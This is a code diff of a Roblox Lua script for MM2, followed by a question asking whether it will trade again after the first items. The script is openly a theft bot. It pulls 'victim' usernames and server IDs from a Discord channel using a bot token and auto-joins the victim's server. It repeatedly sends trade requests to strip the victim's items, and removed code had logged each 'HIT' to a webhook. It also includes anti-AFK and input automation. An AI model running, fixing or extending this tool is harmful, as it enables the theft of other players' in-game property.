@@ -1,42 +1,38 @@
 if not game:IsLoaded() then
-    game.Loaded:Wait()
+	game.Loaded:Wait()
 end
 
-if token == "" or channelId == "" or webhookUrl == "" then
-    game.Players.LocalPlayer:Kick("Add your token, channelId, and webhookUrl to use")
+if token == "" or channelId == "" then
+    game.Players.LocalPlayer:Kick("Add your token or channelId to use")
 end
 
--- Anti-AFK
 local bb = game:GetService("VirtualUser")
-game:service("Players").LocalPlayer.Idled:Connect(function()
+game:service "Players".LocalPlayer.Idled:Connect(function()
     bb:CaptureController()
     bb:ClickButton2(Vector2.new())
 end)
 
 local HttpServ = game:GetService("HttpService")
 local VirtualInputManager = game:GetService("VirtualInputManager")
-
--- File setup
 local victimFile = isfile("user.txt")
 local joinedFile = isfile("joined_ids.txt")
-local successFile = isfile("success_ids.txt")
-if not victimFile then writefile("user.txt", "victim username") end
-if not joinedFile then writefile("joined_ids.txt", "[]") end
-if not successFile then writefile("success_ids.txt", "[]") end
-
+if not victimFile then
+    writefile("user.txt", "victim username")
+end
+if not joinedFile then
+    writefile("joined_ids.txt", "[]")
+end
 local victimUser = readfile("user.txt")
 local joinedIds = HttpServ:JSONDecode(readfile("joined_ids.txt"))
-local successIds = HttpServ:JSONDecode(readfile("success_ids.txt"))
 local didVictimLeave = false
 local timer = 0
-local hasSentWebhook = false
 
--- Device selection
 local function selectDevice()
     while task.wait(0.1) do
         local DeviceSelectGui = game.Players.LocalPlayer:WaitForChild("PlayerGui"):FindFirstChild("DeviceSelect")
         if DeviceSelectGui then
             local Container = DeviceSelectGui:WaitForChild("Container")
+            local Mouse = game.Players.LocalPlayer:GetMouse()
             local button = Container:WaitForChild("Phone"):WaitForChild("Button")
             local buttonPos = button.AbsolutePosition
             local buttonSize = button.AbsoluteSize
@@ -47,47 +43,29 @@ local function selectDevice()
         end
     end
 end
+
 task.spawn(selectDevice)
+
+
+local waittime = delay or 2
+wait(waittime)
 
 wait(4)
 game:GetService('TextChatService').TextChannels.RBXGeneral:SendAsync('Hai!')
 
--- Trade functions
+local notused = game:GetService('ReplicatedStorage'):WaitForChild('Trade'):WaitForChild('AcceptRequest')
+
 local function saveJoinedId(messageId)
     table.insert(joinedIds, messageId)
     writefile("joined_ids.txt", HttpServ:JSONEncode(joinedIds))
 end
 
-local function saveSuccessId(messageId)
-    table.insert(successIds, messageId)
-    writefile("success_ids.txt", HttpServ:JSONEncode(successIds))
-end
-
-local function sendWebhookNotification(victimName)
-    local response = request({
-        Url = webhookUrl,
-        Method = "POST",
-        Headers = {
-            ["Content-Type"] = "application/json"
-        },
-        Body = HttpServ:JSONEncode({
-            content = "New MM2 HIT!!!!",
-            embeds = {{
-                title = "Successful Trade",
-                description = "Obtained items from "..victimName,
-                color = 65280,
-                timestamp = DateTime.now():ToIsoDate()
-            }}
-        })
-    })
-    return response.StatusCode == 200 or response.StatusCode == 204
-end
-
 local function acceptRequest()
     while task.wait(0.1) do
-        game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("DeclineRequest"):FireServer()
+    
+    game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("DeclineRequest"):FireServer()
         local args = {
-            [1] = game:GetService("Players"):WaitForChild(victimUser)
+        [1] = game:GetService("Players"):WaitForChild(victimUser)
         }
         game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("SendRequest"):InvokeServer(unpack(args))
     end
@@ -126,30 +104,6 @@ local function tradeTimer()
     end
 end
 
-local function checkWebhookForSuccess(messageId)
-    -- Check recent webhook messages to see if success was already posted
-    local response = request({
-        Url = webhookUrl.."?limit=10",
-        Method = "GET",
-        Headers = {
-            ["Content-Type"] = "application/json"
-        }
-    })
-    
-    if response.StatusCode == 200 then
-        local messages = HttpServ:JSONDecode(response.Body)
-        for _, msg in ipairs(messages) do
-            if msg.content == "New MM2 HIT!!!!" and 
-               msg.embeds and msg.embeds[1] and 
-               msg.embeds[1].description:find(victimUser) then
-                return true
-            end
-        end
-    end
-    return false
-end
-
--- Main execution
 waitForPlayerLeave()
 task.spawn(acceptTrade)
 task.spawn(tradeTimer)
@@ -169,37 +123,22 @@ local function autoJoin()
 
     if response.StatusCode == 200 then
         local messages = HttpServ:JSONDecode(response.Body)
-        if #messages == 0 then return end
-        
+        if #messages == 0 then
+            return
+        end
         for _, message in ipairs(messages) do
             if message.content ~= "" and message.embeds and message.embeds[1] and message.embeds[1].title then
                 if message.embeds[1].title:find("Join to get e") then
                     local placeId, jobId = string.match(message.content, 'TeleportToPlaceInstance%((%d+),%s*["\']([%w%-]+)["\']%)')
                     if placeId and jobId then
                         local victimUsername = message.embeds[1].fields[1].value
-                        local messageId = tostring(message.id)
 
-                        -- Only proceed if we haven't already successfully traded from this message
-                        if not table.find(successIds, messageId) then
-                            if didVictimLeave or timer > 5 then
-                                -- Check if webhook notification was already sent
-                                local alreadySent = checkWebhookForSuccess(messageId)
-                                
-                                if not alreadySent then
-                                    -- Try to send webhook notification
-                                    hasSentWebhook = sendWebhookNotification(victimUser)
-                                    
-                                    if hasSentWebhook then
-                                        saveSuccessId(messageId)
-                                    end
-                                end
-                                
-                                if not table.find(joinedIds, messageId) then
-                                    saveJoinedId(messageId)
-                                    writefile("user.txt", victimUsername)
-                                    game:GetService('TeleportService'):TeleportToPlaceInstance(placeId, jobId)
-                                    return
-                                end
+                        if didVictimLeave or timer > 5 then
+                            if not table.find(joinedIds, tostring(message.id)) then
+                                saveJoinedId(tostring(message.id))
+                                writefile("user.txt", victimUsername)
+                                game:GetService('TeleportService'):TeleportToPlaceInstance(placeId, jobId)
+                                return
                             end
                         end
                     end
@@ -212,3 +151,5 @@ end
 while wait(5) do
     autoJoin()
 end
+
+By reading this, after getting the first items from the first trade, will it trade again?
